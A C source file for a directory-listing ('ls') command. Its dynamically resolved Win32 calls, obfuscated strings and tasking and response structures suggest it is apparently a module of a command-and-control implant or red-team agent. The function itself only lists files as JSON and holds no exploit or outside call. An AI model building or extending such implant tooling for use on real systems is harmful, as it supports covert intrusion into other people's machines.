#include "config.h"
#ifdef INCLUDE_CMD_LS

#include "commands.h"

static void _add_uint(PINSTANCE inst, PPACKAGE response, DWORD v) {
    char tmp[16];
    int ti = 0;
    if (v == 0) { tmp[ti++] = '0'; }
    else {
        char rev[16]; int ri = 0;
        while (v > 0) { rev[ri++] = '0' + (v % 10); v /= 10; }
        for (int j = ri - 1; j >= 0; j--) tmp[ti++] = rev[j];
    }
    package_add_bytes(inst, response, (BYTE*)tmp, ti);
}

static void _add_escaped(PINSTANCE inst, PPACKAGE response, const char* s) {
    for (int i = 0; s[i]; i++) {
        char c = s[i];
        if (c == '\\')     package_add_bytes(inst, response, (BYTE*)"\\\\", 2);
        else if (c == '"') package_add_bytes(inst, response, (BYTE*)"\\\"", 2);
        else               package_add_bytes(inst, response, (BYTE*)&c, 1);
    }
}

VOID cmd_ls(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD path_len = 0;
    char* path = parser_string(args, &path_len);

    char search_path[MAX_PATH + 4] = {0};
    char base_path[MAX_PATH + 1] = {0};

    if (path && path_len > 0) {
        DWORD cp = path_len < MAX_PATH ? path_len : MAX_PATH;
        es_memcpy(search_path, path, cp);
        es_memcpy(base_path, path, cp);
        if (search_path[cp-1] != '\\' && search_path[cp-1] != '/') {
            search_path[cp] = '\\';
            cp++;
        }
        search_path[cp] = '*';
    } else {
        search_path[0] = '.'; search_path[1] = '\\'; search_path[2] = '*';
        base_path[0] = '.';
    }

    // Resolve to absolute path for the JSON parent_path field
    char abs_path[MAX_PATH + 1] = {0};
    DWORD abs_len = inst->Win32.GetCurrentDirectoryA(MAX_PATH, abs_path);
    if (base_path[0] != '.' || base_path[1] != '\0') {
        es_memcpy(abs_path, base_path, MAX_PATH);
    }

    WIN32_FIND_DATAA fd;
    HANDLE hFind = inst->Win32.FindFirstFileA(search_path, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        package_add_string(inst, response, XSTR("Directory not found"));
        response->is_error = TRUE;
        return;
    }

    package_add_bytes(inst, response, (BYTE*)"[", 1);
    BOOL first = TRUE;

    do {
        if (fd.cFileName[0] == '.' && fd.cFileName[1] == '\0') continue;
        if (fd.cFileName[0] == '.' && fd.cFileName[1] == '.' && fd.cFileName[2] == '\0') continue;

        if (!first) package_add_bytes(inst, response, (BYTE*)",", 1);
        first = FALSE;

        BOOL isDir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;

        package_add_bytes(inst, response, (BYTE*)"{\"name\":\"", 9);
        _add_escaped(inst, response, fd.cFileName);
        package_add_bytes(inst, response, (BYTE*)"\",\"is_file\":", 12);

        if (isDir) {
            package_add_bytes(inst, response, (BYTE*)"false,\"size\":0}", 15);
        } else {
            package_add_bytes(inst, response, (BYTE*)"true,\"size\":", 12);
            _add_uint(inst, response, fd.nFileSizeLow);
            package_add_bytes(inst, response, (BYTE*)"}", 1);
        }
    } while (inst->Win32.FindNextFileA(hFind, &fd));

    package_add_bytes(inst, response, (BYTE*)"]", 1);
    inst->Win32.FindClose(hFind);
}

#endif
